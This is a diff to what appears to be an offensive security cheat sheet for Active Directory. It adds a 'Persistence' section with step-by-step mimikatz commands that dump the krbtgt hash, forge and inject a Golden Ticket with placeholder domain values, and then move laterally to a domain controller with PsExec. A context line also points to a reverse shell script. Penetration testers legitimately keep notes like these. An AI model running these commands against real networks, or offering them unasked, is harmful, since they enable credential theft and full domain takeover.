@@ -99,6 +99,7 @@ systeminfo
 
 #User info
 whoami
+whoami /user
 whoami /groups
 Get-LocalUser
 #Local
@@ -678,3 +679,15 @@ ls \\shared01\usernamesfolder
 #Distributed Component Object Model a.k.a. DCOM
 #DCOM communicates over RPC on TCP 135 and LA credentials are required to leverage the DCOM Service Control Manager (API)
 See enumhelper.ps1 for example usage for remote commands and reverse shell
+
+##Persistence
+#Golden Ticket, a ticket forged using krbtgt password for which you need an account with access to Domain Admin's group or a compromized DC, using mimikatz:
+privilege::debug
+lsadump::lsa /patch
+#Now the ticket can be created using the NTLM-hash and domain SID from results, injecting the ticket doesn't require any special rights
+kerberos::purge
+kerberos::golden /user:nonprivileged_user /domain:testad.local /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:1234a5bcdefabc6de78fa90b1c234d56 /ptt
+#With the injected golden ticket you can now go laterally with privileged cmd:
+misc::cmd
+#Connecting to DC01 for example, needs to be done with the hostname, with IP the request will be blocked as the auth type would be NTLM:
+PsExec.exe \\DC01.testad.local cmd.exe
